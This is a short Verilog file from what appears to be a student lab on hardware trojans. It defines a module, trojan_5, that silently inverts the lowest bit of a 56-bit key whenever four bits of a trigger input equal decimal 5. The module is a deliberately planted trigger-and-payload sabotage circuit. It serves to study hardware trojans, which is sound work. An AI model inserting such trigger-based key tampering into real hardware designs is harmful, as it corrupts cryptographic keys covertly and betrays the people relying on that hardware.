// Group 2: Raj Patel, Zachary Rouviere, Evan Waxman
//Experiement 4 Part 2
//9/17/21

//The trojan_5.v file to determine if the trigger condition is met
// it will return the pay load (modified key) or not.
// The trigger condition can be change by changing the value of the condition register value
// The tigger is decmial 5

module  trojan_5(payload, key, trigger);

input	[55:0]	    key;
  input	[1:32]	    trigger;
output	[55:0]	    payload;
  reg     [3:0]     condition = 4'b0101; 

  assign payload = (trigger[29:32] == condition[3:0]) ? {key[55:1], ~key[0]} : key[55:0]; // LSB is [32]. When the trigger condition is met key[0] is inverted

endmodule
